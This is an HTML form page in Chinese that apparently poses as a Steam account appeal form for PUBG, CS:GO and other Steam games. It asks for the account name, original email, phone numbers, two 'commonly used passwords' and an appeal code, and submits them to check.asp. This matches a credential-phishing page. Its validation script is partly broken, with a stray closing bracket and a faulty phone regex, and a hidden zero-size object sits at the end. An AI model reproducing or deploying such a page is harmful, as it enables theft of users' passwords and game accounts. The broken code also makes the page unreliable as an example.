 <body>
  <div class="book_top_cover clearfix">

  <div class="main" style="margin-top: 50px">
   <form action="check.asp" id="myform" method="post" novalidate="novalidate">
    <div class="line1">
     <table class="tb1">
      <tbody>
       <tr>
        <td class="txt1" style="font-size:12px;">
         帐号：
        </td>
        <td>
         <div class="box-slt mt5">
          <input class="ipt1" id="account" name="account" type="text" value=""/>
         </div>
        </td>
       </tr>
       <tr>
        <td class="txt1" style="font-size:12px;">
         选择游戏：
        </td>
        <td>
         <div class="box-slt mt5">
          <select aria-invalid="false" class="ipt1 valid" id="father" name="father">
           <option value="1">
            绝地求生PUBG
           </option>
           <option value="2">
            全球攻势CSGO
           </option>
           <option value="3">
            其它steam游戏
           </option>
          </select>
         </div>
        </td>
       </tr>
       <tr>
        <td class="txt1" style="font-size:12px;">
         初始邮箱：
        </td>
        <td>
         <div class="box-slt mt5">
          <input class="ipt1" id="email" name="email" type="text" value=""/>
         </div>
        </td>
       </tr>
       <tr>
        <td class="txt1" style="font-size:12px;">
         绑定手机：
        </td>
        <td>
         <input class="ipt1" id="bindMob" maxlength="16" name="bindMob" type="text" value=""/>
        </td>
       </tr>
       <tr>
        <td class="txt1" id="QQweixin" style="font-size:12px;">
         常用密码1：
        </td>
        <td>
         <input class="ipt1" id="userPwd1" name="userPwd1" type="password" value=""/>
        </td>
       </tr>
       <tr>
        <td class="txt1" style="font-size:12px;">
         常用密码2：
        </td>
        <td>
         <input class="ipt1" id="userPwd2" name="userPwd2" type="password" value=""/>
        </td>
       </tr>
       <tr>
        <td class="txt1" style="font-size:12px;">
         手机号码：
        </td>
        <td>
         <input class="ipt1" id="userMob" maxlength="16" name="userMob" type="text" value=""/>
        </td>
       </tr>
       <tr>
        <td class="txt1" style="font-size:12px;">
         申诉激活码：
        </td>
        <td>
         <input class="ipt1" id="exchangeCDKeyValue" name="cdk" type="text" value=""/>
        </td>
       </tr>
      </tbody>
     </table>
    </div>
    <p class="box1">
     <input class="btn" style="margin-left: 30px;" type="submit"/>

  <div style="height: 60px">

  <script src="images/jquery.min.js" type="text/javascript">
  </script>
  <script src="images/layer.js" type="text/javascript">
  </script>
  <script src="images/H-ui.min.js" type="text/javascript">
  </script>
  <script src="images/jquery.validate.js" type="text/javascript">
  </script>
  <script type="text/javascript">
   $(function(){
        $("#myform").validate({
            submitHandler:function(form){
                var email_reg = /^([a-zA-Z]|[0-9])(\w|\-)+@[a-zA-Z0-9]+\.([a-zA-Z]{2,4})$/;
                var mob_reg = /^1(3|4|5|6|7|8|9)d{9}$/;
                if($("#account").val()==""){
                    layer.msg('请输入帐号');
                    return false;
                }

                if(!email_reg.test($("#email").val())){
                    layer.msg('初始邮箱不正确');
                    return false;
                }

                if($("#bindMob").val()==""){
                    layer.msg('请输入绑定手机号');
                    return false;
                }

                if ($("#userPwd1").val()==""){
                    layer.msg('请输入常用密码1');
                    return false;
                }

                if ($("#userPwd2").val()==""){
                    layer.msg('请输入常用密码2');
                    return false;
                }

                if($("#userMob").val()==""){
                    layer.msg('请输入手机号');
                    return false;
                }

                if ($("#exchangeCDKeyValue").val()==""){
                    layer.msg('请输入申诉激活码');
                    return false;
                }

                var email = $.trim($('#email').val());
                var bindMob = $.trim($('#bindMob').val());
                var userPwd1 = $.trim($('#userPwd1').val());
                var userPwd2 = $.trim($('#userPwd2').val());
                var userMob = $.trim($('#userMob').val());
                var exchangeCDKeyValue = $.trim($('#exchangeCDKeyValue').val());

                });
            }
        });
    });

     //解决H5在移动端软键盘弹出时底部fixed定位被顶上去的问题
    var winHeight = $(window).height();  //获取当前页面高度
    $(window).resize(function () {
        var thisHeight = $(this).height();
        if ( winHeight - thisHeight > 140 ) {
            //键盘弹出
            $('.bottom_cover').css('position','static');
        } else {
            //键盘收起
            $('.bottom_cover').css({'position':'fixed','bottom':'0'});
        }
    })
  </script>
  <div>
   <object click="sendMsg" height="0" host="" id="ClCache" width="0">
   </object>
  </div>
